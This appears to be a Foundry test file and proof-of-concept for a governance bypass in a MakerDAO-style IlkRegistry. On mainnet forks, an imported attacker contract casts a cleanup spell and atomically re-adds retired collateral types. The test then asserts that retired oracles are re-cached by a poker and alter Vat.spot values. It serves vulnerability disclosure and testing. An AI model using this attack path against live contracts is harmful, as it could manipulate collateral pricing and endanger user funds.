// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity ^0.8.16;

import {console2} from "forge-std/console2.sol";
import {
    IlkRegistryCurrentMassReAddTest,
    CurrentRegistryLike,
    CurrentVatLike
} from "./IlkRegistryCurrentMassReAdd.t.sol";
import {AtomicCleanupReversal, AtomicSpellLike} from "./IlkRegistryAtomicGovernanceReversal.t.sol";

interface RetirementChainlogLike {
    function getAddress(bytes32 key) external view returns (address);
}

interface RetirementOmegaLike {
    function refresh() external;
    function poke() external;
    function ilkCount() external view returns (uint256);
    function ilks(uint256 index) external view returns (bytes32);
}

contract IlkRegistryChainlogRetirementBypassTest is IlkRegistryCurrentMassReAddTest {
    uint256 internal constant PRE_CAST_BLOCK = 23_118_263;
    address internal constant CLEANUP_SPELL = 0x26009aFf7fE39bF7611d66E0D38CAc43b3A93CD5;
    address internal constant CHAINLOG = 0xdA0Ab1e0017DEbCd72Be8599041a2aa3bA7e740F;
    address internal constant OMEGA_POKER = 0xDd538C362dF996727054AC8Fb67ef5394eC9b8b9;

    CurrentRegistryLike internal constant retirementRegistry = CurrentRegistryLike(REGISTRY);
    RetirementOmegaLike internal constant omega = RetirementOmegaLike(OMEGA_POKER);

    function _oracleKeys() internal pure returns (bytes32[] memory keys) {
        keys = new bytes32[](8);
        keys[0] = "PIP_AAVE";
        keys[1] = "PIP_BAL";
        keys[2] = "PIP_COMP";
        keys[3] = "PIP_LINK";
        keys[4] = "PIP_RENBTC";
        keys[5] = "PIP_UNI";
        keys[6] = "PIP_USDC";
        keys[7] = "PIP_ZRX";
    }

    function _selectedIlks() internal pure returns (bytes32[] memory ilks_) {
        ilks_ = new bytes32[](9);
        ilks_[0] = "AAVE-A";
        ilks_[1] = "BAL-A";
        ilks_[2] = "COMP-A";
        ilks_[3] = "LINK-A";
        ilks_[4] = "RENBTC-A";
        ilks_[5] = "UNI-A";
        ilks_[6] = "USDC-A";
        ilks_[7] = "USDC-B";
        ilks_[8] = "ZRX-A";
    }

    function _chainlogPresent(bytes32 key) internal view returns (bool present, address value) {
        (bool ok, bytes memory data) = CHAINLOG.staticcall(
            abi.encodeWithSelector(RetirementChainlogLike.getAddress.selector, key)
        );
        if (!ok || data.length < 32) return (false, address(0));
        value = abi.decode(data, (address));
        present = value != address(0);
    }

    function _omegaContains(bytes32 needle) internal view returns (bool) {
        uint256 count = omega.ilkCount();
        for (uint256 i = 0; i < count; i++) {
            if (omega.ilks(i) == needle) return true;
        }
        return false;
    }

    function _countSelectedInOmega(bool logItems) internal view returns (uint256 cached) {
        bytes32[] memory selected = _selectedIlks();
        for (uint256 i = 0; i < selected.length; i++) {
            if (_omegaContains(selected[i])) {
                cached++;
                if (logItems) {
                    console2.log("retired ilk recached by Omega");
                    console2.logBytes32(selected[i]);
                    console2.log("Registry pip", retirementRegistry.pip(selected[i]));
                }
            }
        }
    }

    function _countRetiredChainlogKeys() internal view returns (uint256 retired) {
        bytes32[] memory keys = _oracleKeys();
        for (uint256 i = 0; i < keys.length; i++) {
            (bool present,) = _chainlogPresent(keys[i]);
            if (!present) retired++;
        }
    }

    function _captureSpots(bytes32[] memory selected) internal view returns (uint256[] memory spots) {
        CurrentVatLike vat = CurrentVatLike(retirementRegistry.vat());
        spots = new uint256[](selected.length);
        for (uint256 i = 0; i < selected.length; i++) {
            (,, spots[i],,) = vat.ilks(selected[i]);
        }
    }

    function _countSpotChanges(bytes32[] memory selected, uint256[] memory beforeSpots)
        internal
        view
        returns (uint256 changed)
    {
        CurrentVatLike vat = CurrentVatLike(retirementRegistry.vat());
        for (uint256 i = 0; i < selected.length; i++) {
            (,, uint256 afterSpot,,) = vat.ilks(selected[i]);
            if (afterSpot != beforeSpots[i]) {
                changed++;
                console2.log("Vat.spot changed for retired ilk");
                console2.logBytes32(selected[i]);
                console2.log("spot before", beforeSpots[i]);
                console2.log("spot after", afterSpot);
            }
        }
    }

    function _captureAdapters() internal view returns (address[] memory adapters) {
        bytes32[] memory targets = _targets();
        adapters = new address[](targets.length);
        for (uint256 i = 0; i < targets.length; i++) {
            adapters[i] = retirementRegistry.join(targets[i]);
            assertTrue(adapters[i] != address(0), "standard cleanup target missing before cast");
        }
    }

    function testAtomicReAddBypassesCoordinatedChainlogOracleRetirement() public {
        uint256 cleanFork = vm.createFork("mainnet", PRE_CAST_BLOCK);
        uint256 attackFork = vm.createFork("mainnet", PRE_CAST_BLOCK);

        vm.selectFork(cleanFork);
        AtomicSpellLike(CLEANUP_SPELL).cast();
        assertEq(_countRetiredChainlogKeys(), 8, "clean spell did not retire selected Chainlog oracle keys");
        omega.refresh();
        uint256 cleanCached = _countSelectedInOmega(false);
        assertEq(cleanCached, 0, "clean governance state still exposes selected retired ilks to Omega");

        vm.selectFork(attackFork);
        address[] memory adapters = _captureAdapters();
        AtomicCleanupReversal attacker = new AtomicCleanupReversal();
        uint256 restored = attacker.castAndRestore(CLEANUP_SPELL, REGISTRY, adapters);

        uint256 retiredKeys = _countRetiredChainlogKeys();
        omega.refresh();
        uint256 attackedCached = _countSelectedInOmega(true);

        bytes32[] memory selected = _selectedIlks();
        uint256[] memory spotsBefore = _captureSpots(selected);
        omega.poke();
        uint256 spotChanges = _countSpotChanges(selected, spotsBefore);

        console2.log("selected Chainlog oracle keys still retired", retiredKeys);
        console2.log("atomically restored Registry ilks", restored);
        console2.log("selected ilks cached in clean state", cleanCached);
        console2.log("selected retired ilks recached after attack", attackedCached);
        console2.log("selected retired Vat.spot values changed", spotChanges);
        console2.log("final attacked Registry count", retirementRegistry.count());

        assertEq(retiredKeys, 8, "attacker unexpectedly restored Chainlog oracle keys");
        assertEq(restored, 31, "unexpected Registry restoration count");
        assertEq(retirementRegistry.count(), 61, "unexpected attacked Registry count");
        assertGt(attackedCached, cleanCached, "Registry re-add did not bypass Chainlog retirement in Omega");
        assertGt(spotChanges, 0, "retired oracle path did not propagate into Vat.spot");
    }
}
